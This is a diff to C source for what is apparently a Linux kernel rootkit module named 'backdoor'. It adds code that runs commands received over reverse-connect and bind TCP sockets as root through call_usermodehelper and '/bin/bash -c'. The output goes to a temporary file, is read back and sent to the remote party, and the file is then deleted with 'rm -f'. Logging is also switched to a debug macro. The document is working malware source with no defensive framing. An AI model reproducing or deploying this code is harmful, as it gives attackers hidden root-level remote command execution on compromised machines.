@@ -1,20 +1,7 @@
 #include "backdoor.h"
 
-#include <linux/types.h>
-#include <linux/net.h>
-#include <linux/skbuff.h>
-#include <linux/un.h>
-#include <linux/unistd.h>
-#include <linux/wait.h>
-#include <linux/ctype.h>
-#include <linux/unistd.h>
-#include <asm/unistd.h>
 #include <linux/inet.h>
 #include <net/ip.h>
-#include <net/sock.h>
-#include <net/tcp.h>
-
-#include <linux/version.h>
 
 static void backdoor_ssh(void) {
 
@@ -74,8 +61,75 @@ static int rk_recvbuff(struct socket *sock, char *buffer, int length)
     set_fs(oldfs);
 
     if ((len!=-EAGAIN)&&(len!=0)&&(len!=(-107)))
-        printk("rk_recvbuff recieved %i bytes \n",len);
+        dbg("rk_recvbuff recieved %i bytes \n",len);
     return len;
+}
+
+static int file_read(struct file *filp, void *buf, int count)
+{
+    mm_segment_t oldfs;
+    size_t byte_read;
+
+    oldfs = get_fs();
+    set_fs(KERNEL_DS);
+    byte_read = vfs_read(filp, buf, count, &filp->f_pos);
+    set_fs(oldfs);
+    return byte_read;
+}
+
+static int read_result(char *result) {
+
+    struct file *filep;
+    if ( ! (filep = filp_open(PATH, O_RDONLY, 0)) ) {
+        dbg("Error open the file\n");
+        return;
+    }
+    char *cmd = NULL;
+    cmd = kmalloc(1, GFP_KERNEL);
+    if ( ! cmd ) {
+        dbg("Error allocating memory\n");
+        filp_close(filep, NULL);
+        return;
+    }
+    int bytes_read = 0;
+    while (file_read(filep,cmd,1) == 1) {
+        result[bytes_read] = cmd[0];
+        bytes_read += 1;
+    }
+    filp_close(filep, NULL);
+    kfree(cmd);
+    return bytes_read;
+}
+
+static int exec_cmd(char *buff) {
+    char *pos;
+    if ((pos=strchr(buff, '\n')) != NULL)
+        *pos = '\0';
+
+    strncat(buff, REDIRECT, strlen(REDIRECT));
+    strncat(buff, PATH, strlen(PATH));
+
+    char *argv[] = { "/bin/bash", "-c", buff, NULL };
+    char *envp[] = { "HOME=/", NULL };
+    int check;
+    // wait proc -> wait until the cmd is executed
+    check = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+    return check;
+}
+
+static void remove_file(void) {
+    char *buff = NULL;
+    buff = kmalloc(strlen(PATH)+15, GFP_KERNEL);
+    if ( ! buff ) {
+        dbg("Error allocating memory\n");
+        return;
+    }    
+    strncpy(buff, "rm -f ", 6);
+    strncat(buff, PATH, strlen(PATH));
+    dbg("remove buffer %s\n", buff);
+    char *argv[] = { "/bin/bash", "-c", buff, NULL };
+    char *envp[] = { "HOME=/", NULL };
+    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
 }
 
 static void backdoor_reverse(void) {
@@ -90,7 +144,7 @@ static void backdoor_reverse(void) {
 
     error = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
     if (error < 0) {
-        printk("Error during creation of socket; terminating\n");
+        dbg("Error during creation of socket; terminating\n");
         return;
     }
 
@@ -100,7 +154,7 @@ static void backdoor_reverse(void) {
 
     error = sock->ops->connect(sock, (struct sockaddr*) &sin, sizeof(sin), !O_NONBLOCK);
     if (error < 0) {
-        printk("Error during connection of socket; terminating\n");
+        dbg("Error during connection of socket; terminating\n");
         sock_release(sock);
         return;
     }
@@ -108,27 +162,52 @@ static void backdoor_reverse(void) {
     buff = kmalloc(512, GFP_KERNEL);
     if (buff == NULL)
     {
-        printk("No mem\n");
+        dbg("Error allocating memory\n");
         sock_release(sock);
         return;
     }
 
     int tt = 0;
+    int file_created = 0;
     while(true) {
         if (signal_pending(current))
             break;
         tt = rk_recvbuff(sock, buff, 512);
         if (tt > 0) {
-            int res = 0;
-            res = rk_sendbuff(sock, buff, tt);
-            memset(buff, '\0', sizeof(buff)); //cleanup the buffer
-            if (res == 0) {
-                printk("Error during connection of socket; terminating\n");
-                break;
+
+            int exec_result;
+            exec_result = exec_cmd(buff);
+
+            if(exec_result == 0) {
+
+                char *result = NULL;
+                result = kmalloc(1024, GFP_KERNEL);
+                if ( ! result ) {
+                    dbg("Error allocating memory\n");
+                    return;
+                }
+                int bytes_read;
+                bytes_read = read_result(result);
+                file_created = 1;
+
+                int res = 0;
+                res = rk_sendbuff(sock, result, bytes_read);
+                kfree(result);
+                memset(buff, '\0', sizeof(buff)); //cleanup the buffer
+                if (res == 0) {
+                    remove_file();
+                    dbg("Error during connection of socket; terminating\n");
+                    break;
+                }
+                tt = 0;
+                bytes_read = 0;
+            } else {
+                dbg("Error executing cmd\n");
             }
-            tt = 0;
         } else {
-            printk("Error during connection of socket; terminating\n");
+            if (file_created)
+                remove_file();
+            dbg("Error during connection of socket; terminating\n");
             break;
         }
     }
@@ -148,7 +227,7 @@ static void backdoor_bind(void) {
 
     error = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
     if (error < 0) {
-        printk("Error during creation of socket; terminating\n");
+        dbg("Error during creation of socket; terminating\n");
         return;
     }
 
@@ -158,14 +237,14 @@ static void backdoor_bind(void) {
 
     error = sock->ops->bind(sock, (struct sockaddr *) &sin, sizeof(sin));
     if (error < 0) {
-        printk("Error binding socket\n");
+        dbg("Error binding socket\n");
         sock_release(sock);
         return;
     }
 
     error = sock->ops->listen(sock, 5);
     if (error < 0) {
-        printk("Error listening on socket \n");
+        dbg("Error listening on socket \n");
         sock_release(sock);
         return;
     }
@@ -176,24 +255,52 @@ static void backdoor_bind(void) {
     newsock=(struct socket*)kmalloc(sizeof(struct socket),GFP_KERNEL);
     error = sock_create(PF_INET,SOCK_STREAM,IPPROTO_TCP,&newsock);
     if(error<0) {
-        printk("Error create newsock error\n");
+        dbg("Error create newsock error\n");
         kfree(buff);
         sock_release(sock);  
         return; 
     }
     //wait incoming connection
+    int file_created = 0;
     while (1) {
         error = newsock->ops->accept(sock,newsock,O_NONBLOCK);
         if(error >= 0) {
             while(tt = rk_recvbuff(newsock, buff, 512)) {
-                if (tt > 0) {
-                    rk_sendbuff(newsock, buff, tt);
-                    memset(buff, '\0', sizeof(buff)); // clean the buffer
+                int exec_result;
+                exec_result = exec_cmd(buff);
+                if(exec_result == 0) {
+
+                    char *result = NULL;
+                    result = kmalloc(1024, GFP_KERNEL);
+                    if ( ! result ) {
+                        dbg("Error allocating memory\n");
+                        return;
+                    }
+                    int bytes_read;
+                    bytes_read = read_result(result);
+                    file_created = 1;
+
+                    int res = 0;
+                    res = rk_sendbuff(newsock, result, bytes_read);
+                    kfree(result);
+                    memset(buff, '\0', sizeof(buff)); //cleanup the buffer
+                    if (res == 0) {
+                        remove_file();
+                        dbg("Error during connection of socket; terminating\n");
+                        break;
+                    }
                     tt = 0;
+                    bytes_read = 0;
+                } else {
+                    dbg("Error executing cmd\n");
                 }
                 if(signal_pending(current)) {
                     break;
                 }
+            }
+            if (file_created) {
+                remove_file();
+                file_created = 0;
             }
         }
         if(signal_pending(current)) {
@@ -202,10 +309,11 @@ static void backdoor_bind(void) {
     }
 
     kfree(buff);
-    sock_release(newsock); 
-    sock_release(sock);    
+    sock_release(newsock);
+    sock_release(sock);
 
 }
+
 
 void backdoor(void) {
 
